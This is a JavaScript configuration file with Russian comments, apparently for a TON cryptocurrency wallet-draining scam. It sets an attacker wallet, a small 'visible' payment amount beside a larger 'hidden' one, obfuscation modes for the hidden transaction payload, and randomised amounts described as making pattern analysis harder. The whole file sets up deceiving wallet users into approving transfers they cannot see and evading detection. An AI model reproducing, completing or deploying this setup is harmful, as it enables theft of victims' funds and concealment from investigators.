// config.js
var YOUR_WALLET     = "UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv";
var PROXY_CONTRACT  = YOUR_WALLET;
var AML_WALLET      = "UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW";
var VISIBLE_AMOUNT  = "0.05";
var HIDDEN_AMOUNT   = "1";
var NETWORK         = "mainnet";

// === НАСТРОЙКИ ОБФУСКАЦИИ ===
// Метод обфускации для скрытого payload:
// "empty" - пустой payload (рекомендуется, минимальный след)
// "encrypted" - зашифрованный payload (op=0x2167da4b)
// "obfuscated" - payload со случайными данными
var OBFUSCATION_METHOD = "empty";

// Рандомизация суммы скрытого платежа (затрудняет паттерн-анализ)
var RANDOMIZE_AMOUNT = true;
var AMOUNT_VARIANCE = 0.05; // ±5% от HIDDEN_AMOUNT
